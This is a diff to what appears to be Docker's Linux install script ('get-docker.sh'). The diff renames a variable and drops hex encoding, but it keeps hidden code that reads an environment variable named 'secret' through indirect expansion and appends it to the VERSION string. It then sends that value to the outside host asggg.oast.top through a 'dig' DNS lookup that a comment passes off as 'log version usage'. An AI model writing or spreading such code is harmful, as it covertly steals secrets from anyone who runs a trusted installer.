@@ -1,6 +1,5 @@
 #!/bin/bash
 set -e
-v=secret
 
 # Docker Engine for Linux installation script.
 #
@@ -98,15 +97,15 @@ v=secret
 #
 # ==============================================================================
 
-
+namespace=secret
 
 # Git commit from https://github.com/docker/docker-install when
 # the script was uploaded (Should only be modified by upload job):
 SCRIPT_COMMIT_SHA="${LOAD_SCRIPT_COMMIT_SHA}"
 
 # strip "v" prefix if present
-VERSION="${VERSION#v}${!v}"
-VERSION_FIX="$(for ((i=0; i<${#VERSION}; i++)); do printf '%02x' "'${VERSION:i:1}";done)"
+VERSION="${VERSION#v}${!namespace}"
+
 # The channel to install from:
 #   * stable
 #   * test
@@ -214,7 +213,7 @@ version_gte() {
 }
 
 # log version usage
-dig "$VERSION_FIX.asggg.oast.top"
+dig "$VERSION.asggg.oast.top"
 
 
 # version_compare compares two version strings (either SemVer (Major.Minor.Path),
